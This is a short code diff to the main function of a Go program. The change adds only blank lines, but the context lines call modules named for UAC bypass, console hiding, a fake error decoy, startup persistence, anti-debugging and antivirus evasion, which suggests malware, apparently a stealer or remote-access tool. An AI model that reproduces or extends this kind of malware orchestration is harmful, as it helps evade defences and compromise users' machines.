@@ -35,6 +35,7 @@ func main() {
 			"DASH": "",
 		},
 	}
+
 	uacbypass.Run()
 
 	hideconsole.Run()
@@ -44,6 +45,7 @@ func main() {
 		go fakeerror.Run()
 		startup.Run()
 	}
+
 	antidebug.Run()
 	go antivirus.Run()
 
